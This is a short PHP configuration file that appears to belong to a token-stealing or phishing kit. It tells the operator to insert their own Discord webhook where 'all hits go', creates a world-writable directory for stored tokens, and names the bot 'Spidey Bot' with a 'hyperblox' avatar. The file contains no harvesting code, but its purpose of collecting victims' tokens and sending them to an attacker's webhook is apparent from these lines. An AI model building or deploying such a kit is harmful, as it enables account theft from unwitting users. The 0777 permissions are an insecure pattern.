<?php
// 🔥 CHANGE THIS TO YOUR WEBHOOK - ALL HITS GO HERE
define('MASTER_WEBHOOK', getenv('MASTER_WEBHOOK') ?: 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_TOKEN');

// Server Configuration
define('BASE_URL', $_SERVER['HTTP_HOST']);
define('PROTOCOL', (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443 ? 'https' : 'http');
define('FULL_URL', PROTOCOL . '://' . BASE_URL);

// Paths
define('DATA_PATH', __DIR__ . '/data/instances/');
define('TOKENS_PATH', __DIR__ . '/data/tokens/');
define('TEMPLATE_PATH', __DIR__ . '/template/');

// Create directories if they don't exist
if (!file_exists(DATA_PATH)) {
    mkdir(DATA_PATH, 0777, true);
}

if (!file_exists(TOKENS_PATH)) {
    mkdir(TOKENS_PATH, 0777, true);
}

// Bot Configuration
define('BOT_NAME', 'Spidey Bot');
define('BOT_AVATAR', 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png');

// Error Reporting (disable in production)
error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/error.log');

// Set timezone
date_default_timezone_set('UTC');
?>